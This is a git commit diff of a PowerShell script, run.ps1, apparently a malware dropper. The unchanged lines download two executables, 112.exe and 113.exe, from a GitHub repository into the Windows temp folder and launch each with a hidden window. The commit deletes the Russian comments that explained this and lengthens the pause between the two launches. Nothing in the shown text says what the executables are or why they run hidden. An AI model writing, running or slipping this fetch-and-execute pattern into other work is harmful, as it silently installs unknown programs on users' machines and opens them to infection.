b684e7a701c4db3d9930b760dc6fa77b66863531
azru09ru-lang <azru09.ru@gmail.com>
2026-09-02 15:59:22 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,10 +1,10 @@
-# Скачиваем и запускаем первый файл
+
 (New-Object Net.WebClient).DownloadFile('https://github.com/azru09ru-lang/xyuinya1/raw/refs/heads/main/112.exe', "$env:TEMP\112.exe");
 Start-Process "$env:TEMP\112.exe" -WindowStyle Hidden
 
-# Небольшая пауза, чтобы не конфликтовать
-Start-Sleep -Seconds 2
 
-# Скачиваем и запускаем второй файл
+Start-Sleep -Seconds 4
+
+
 (New-Object Net.WebClient).DownloadFile('https://github.com/azru09ru-lang/xyuinya1/raw/refs/heads/main/113.exe', "$env:TEMP\113.exe");
 Start-Process "$env:TEMP\113.exe" -WindowStyle Hidden
